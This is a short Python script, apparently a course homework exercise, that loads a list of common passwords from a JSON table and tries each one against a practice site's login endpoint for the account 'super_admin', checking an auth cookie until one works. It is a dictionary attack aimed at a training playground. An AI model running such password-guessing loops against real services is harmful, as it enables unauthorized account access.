import requests
import sys
import json

with open(f'{sys.path[0]}/pass_table.json') as f:
    table_json = json.loads(f.read())
pass_table = [[c['children'][0]['name'] for j, c in enumerate(r['children']) if j > 0]
              for i, r in enumerate(table_json['children']) if i > 1]

pass_list = []
for row in pass_table:
    for cell in row:
        if cell not in pass_list:
            pass_list += [cell]

url_login = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url_check = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
correct_password = ''
check_response = ''
for password in pass_list:
    response = requests.post(url_login, data={'login': 'super_admin', 'password': password})
    cookie_value = response.cookies.get('auth_cookie')
    cookie = {'auth_cookie': cookie_value}
    response = requests.post(url_check, cookies=cookie)
    print(response.text)
    if response.text != 'You are NOT authorized':
        correct_password = password
        check_response = response.text
        print(f'{check_response}. Correct password is {correct_password}')
        break

